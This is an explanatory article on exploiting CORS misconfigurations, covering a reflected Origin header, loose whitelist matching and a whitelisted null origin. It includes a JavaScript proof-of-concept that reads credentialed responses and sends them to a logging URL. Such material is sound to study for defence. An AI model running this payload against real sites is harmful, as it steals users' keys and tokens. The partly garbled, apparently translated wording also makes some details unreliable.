A lot of modern websites use CORS to allow access from subdomains and trusted third parties. CORS applications may contain errors or be overly tolerant to make sure that everything is working. In this case, it can cause exploitable security vulnerabilities. 
a:The ACAO header generated by the server from the Origin header determined by the client
Some applications need to provide access to a number of other domains. It takes a constant effort to keep a list of allowed domains. and an error carries the risk of disrupting functionality. That is why some applications find an easier way to effectively allow access from any other domain. 
One way to do this is to read the Origin header from the requests and add a response header indicating that the requesting Origin is allowed. For example, let's consider an application that receives the following request:

GET/sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://website.com
Cookie: sessionid=...

He then responds as follows:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://website.com
Access-Control-Allow-Credentials: true
...

The one who made the request website.com that your address may contain the cookie of requests between resources Dec 
"Access-Control-Allow-Credentials: true" confirms that we received the output in this way.

Since this application reflects random resources, this means that resources in the vulnerable domain of absolutely any domain can be accessed. If the response contains any hashas information such as API key or CSRF token, we can get it by placing the following script on the website:

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://website.com/sensitive-victim-data ',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//website.com/log?key ='+this.responseText;
};

b:errors in parsing origin headers
Some applications that support access from multiple sources do this using the whitelist of allowed resources. When a CORS receives a request, the provided resource is compared to the white list. If the resource appears in the white list, the result is returned as True. Example:

GET/data HTTP/1.1
Host: normal-website.com
...
Origin: https://website.com

If this application is on the list, an answer is given as follows.

HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://website.com

Errors often occur when applying CORS loose whitelists. Some organizations allow access from all subdomains. Some applications may create a rule such as the domain of the domain that is on the white list being in the domain or the entire URL. 
Example: Let's assume that an application grants access to all domains ending with:

website.com

The attacker can gain access by registering the following domain.

vuln-website.com

In another example, suppose an application grants access to all domains starting with:

website.com

The attacker can gain access using the domain.

website.com.hack.net

c:Blank initial value whitelisted
The indication of the Origin header supports the null value.Browsers can return the value in the Origin header in various unusual situations.
=>Decoupling between sources
=>requests from serialized data
=>file: Make a request using the protocol.
=> requests between Decontaminated resources

With some application, it can add the null value to the whitelist.
Example:
GET /sensitive-victim-data
Host: website.com
Origin: null
And he responds in this way.

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

In this case, an attacker can use various tricks to create a cross-origin request containing the value in the Origin header.